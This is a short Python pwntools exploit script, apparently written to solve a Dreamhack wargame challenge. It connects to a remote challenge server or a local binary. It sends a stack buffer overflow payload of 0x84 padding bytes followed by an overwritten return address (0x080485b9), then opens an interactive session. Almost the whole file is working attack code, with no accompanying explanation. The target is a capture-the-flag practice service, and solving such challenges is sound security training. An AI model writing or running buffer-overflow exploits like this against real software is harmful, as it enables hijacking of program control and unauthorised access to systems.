from pwn import process, remote, context, p32, p64, gdb

#a * 84 + asdf
#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdf

REMOTE = True
context.log_level = 'debug'
#context.terminal = ['alacritty', '-e', 'sh', '-c']

if REMOTE:
 p = remote('host3.dreamhack.games',20269)
else:
 p = process('steam-run ./a.out', shell=True)

print(b'a' * 0x84 + p64(0x080485b9))
p.send(b'a' * 0x84 + p64(0x080485b9))
#gdb.attach(p, gdbscript=f'''
#      attach {p.__getattr__('pid')}
#       ''')
#p.send(b'a' * 0x88 + p32(0x080485b9))
p.interactive()

